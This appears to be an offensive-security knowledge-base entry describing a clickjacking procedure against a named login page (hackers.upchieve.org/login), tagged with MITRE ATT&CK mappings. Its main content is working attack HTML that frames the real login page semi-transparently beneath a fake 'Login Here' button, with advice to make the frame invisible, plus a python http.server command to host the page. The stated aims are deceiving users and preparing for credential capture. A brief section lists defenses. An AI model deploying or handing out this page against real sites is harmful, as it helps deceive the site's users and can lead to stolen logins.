---
id: p-embed-iframe-clickjacking
tags:
  - clickjacking
  - web
  - iframe
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:05.000Z'
skill_level: beginner
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Embed Login Page in Attacker-Controlled Iframe

## Summary

This procedure creates a malicious HTML page on an attacker-controlled site that embeds the target login page in an iframe, often with overlays to facilitate clickjacking deception.

## Description

Clickjacking relies on framing a legitimate page invisibly or with deceptive overlays. This procedure involves crafting an HTML file sourcing the vulnerable login URL (e.g., https://hackers.upchieve.org/login) in an iframe, positioning it to trick user interactions. Prerequisites include a hosting environment for the attack page. Outcomes enable user deception, potentially leading to credential capture, though cross-origin limits may require additional techniques like proxying.

## Requirements

1. Text editor to create HTML
2. Local server or hosted domain for the malicious page
3. Vulnerable frameable endpoint identified

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP frame-ancestors policies
- Browser extensions or user training to detect overlays
- Log and alert on anomalous embedding attempts

## Objectives

1. Successfully frame the login page
2. Overlay deceptive UI elements
3. Prepare for user interaction capture

## Instructions

### Step 1: Create Malicious HTML Page

**Context**: Build the base iframe embedding the target login.

Write this HTML file (save as attack.html):

```html
<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body style="margin:0;">
  <iframe id="frame" src="https://hackers.upchieve.org/login" style="position:absolute; top:0; left:0; width:100%; height:100%; border:none; opacity:0.5;"></iframe>
  <div style="position:relative; z-index:1;">
    <h1>Click to Continue</h1>
    <button style="position:absolute; top:100px; left:100px;">Login Here</button>
  </div>
</body>
</html>
```

> The iframe is semi-transparent; adjust opacity to 0 for invisibility. Expected output: Page loads with framed login overlaid by fake elements.

### Step 2: Host and Test the Page

**Context**: Serve the page locally or remotely and verify embedding.

Use a simple server like Python's http.server:

```bash
python3 -m http.server 8000
```

Access http://localhost:8000/attack.html in a browser.

> Confirm the login frames without blocks. Expected output: Interactive framed page ready for deception.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[iframe]]
